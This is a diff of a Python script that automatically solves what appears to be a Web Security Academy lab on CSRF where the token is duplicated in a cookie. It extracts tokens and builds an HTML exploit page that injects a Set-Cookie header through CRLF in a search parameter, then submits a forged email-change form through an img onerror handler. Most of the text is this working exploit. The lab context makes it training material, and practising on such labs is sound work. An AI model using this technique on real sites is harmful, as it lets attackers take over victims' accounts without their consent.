@@ -4,15 +4,15 @@
 #
 # Date: 21/10/2023
 #
-# Lab: CSRF where token is tied to non-session cookie
+# Lab: CSRF where token is duplicated in cookie
 #
 # Steps: 1. Fetch the login page
-#        2. Extract csrf token, session cookie and csrf key cookie
+#        2. Extract csrf token and session cookie
 #        3. Login as wiener
 #        4. Fetch wiener profile
 #        5. Extract the csrf token that is needed for email update
 #        6. Craft an HTML form for changing the email address that includes
-#           the extracted csrf token and an img tag which is used to set the csrfKey
+#           the extracted csrf token and an img tag which is used to set the csrf
 #           cookie via its src and submit the form via its error handler
 #        7. Deliver the exploit to the victim
 #        8. The victim's email will be changed after he trigger the exploit
@@ -32,10 +32,10 @@ import re
 #########
 
 # change this to your lab URL
-lab_url = "https://0a00007304ef5d5781053e0700dd009d.web-security-academy.net"
+lab_url = "https://0a8900e20368d3af894bf9b1003b009e.web-security-academy.net"
 
 # change this to your exploit server URL
-exploit_server_url = "https://exploit-0a7200c304f15da681263dc6011600a7.exploit-server.net"
+exploit_server_url = "https://exploit-0aa700020340d3e78976f8dd01e70073.exploit-server.net"
 
 # the header of your exploit sever response
 exploit_server_head = """HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"""
@@ -53,25 +53,22 @@ print(Fore.WHITE + "⦗1⦘ Fetching the login page.. " + Fore.GREEN + "OK")
 # get session cookie
 session = get_login.cookies.get("session")
 
-# get csrfKey cookie
-csrf_key = get_login.cookies.get("csrfKey")
+# extract the csrf token
+csrf = re.findall("csrf.+value=\"(.+)\"", get_login.content.decode())[0]
 
 # set cookies
 cookies = {
     "session": session,
-    "csrfKey": csrf_key
+    "csrf": csrf
 }
 
-# extract the csrf token
-csrf_token = re.findall("csrf.+value=(.+)>", get_login.content.decode())[0]
-
-print(Fore.WHITE + "⦗2⦘ Extracting csrf token, session cookie and csrf key cookie.. " + Fore.GREEN + "OK")
+print(Fore.WHITE + "⦗2⦘ Extracting csrf token and session cookie.. " + Fore.GREEN + "OK")
 
 # set credentials
 data = {
     "username": "wiener",
     "password": "peter",
-    "csrf": csrf_token
+    "csrf": csrf
 }
 
 try:    
@@ -102,11 +99,8 @@ except:
 
 print(Fore.WHITE + "⦗4⦘ Fetching wiener profile.. " + Fore.GREEN + "OK")
 
-# get csrfKey cookie
-csrf_key = wiener.cookies.get("csrfKey")
-
 # extract the csrf token that is needed for email update
-csrf_token = re.findall("csrf.+value=(.+)>", wiener.content.decode())[0]
+csrf = re.findall("csrf.+value=\"(.+)\"", wiener.content.decode())[0]
 
 print(Fore.WHITE + "⦗5⦘ Extracting the csrf token that is needed for email update.. " + Fore.GREEN + "OK")
 
@@ -119,10 +113,10 @@ payload = f"""<html>
                 <body>
                 <form action="{lab_url}/my-account/change-email" method="POST">
                     <input type="hidden" name="email" value="{new_email}" />
-                    <input type="hidden" name="csrf" value="{csrf_token}" />
+                    <input type="hidden" name="csrf" value="{csrf}" />
                     <input type="submit" value="Submit request" />
                 </form>
-                <img src="{lab_url}/?search=boo%0d%0aSet-Cookie: csrfKey={csrf_key}; SameSite=None" onerror=document.forms[0].submit()>
+                <img src="{lab_url}/?search=boo%0d%0aSet-Cookie: csrf={csrf}; SameSite=None" onerror=document.forms[0].submit()>
                 </body>
             </html>"""
 
